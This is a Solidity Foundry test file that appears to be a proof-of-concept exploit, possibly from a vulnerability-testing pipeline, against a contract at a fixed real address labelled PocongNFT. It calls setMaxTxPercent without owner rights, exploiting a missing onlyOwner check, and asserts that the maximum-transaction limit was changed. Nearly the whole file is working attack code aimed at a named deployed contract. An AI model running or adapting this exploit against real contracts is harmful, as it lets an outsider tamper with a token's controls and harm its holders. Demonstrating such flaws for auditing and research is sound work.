// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPocongNFT {
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function setMaxWalletPercent(uint256 maxWalletPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function _maxWalletToken() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);
    IPocongNFT target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IPocongNFT(TARGET);
        vm.label(TARGET, "PocongNFT");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Record initial value
        uint256 initialMaxTx = target._maxTxAmount();
        console.log("Initial _maxTxAmount:", initialMaxTx);

        // Exploit: Call setMaxTxPercent without owner privileges (missing onlyOwner modifier)
        target.setMaxTxPercent(100);

        // Verify the state was tampered
        uint256 newMaxTx = target._maxTxAmount();
        console.log("New _maxTxAmount:", newMaxTx);

        // Oracle check: _maxTxAmount should NOT equal 15000000000000000
        assertGt(newMaxTx, initialMaxTx, "Exploit failed: _maxTxAmount was not changed");
        assertTrue(target._maxTxAmount() != 15000000000000000, "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
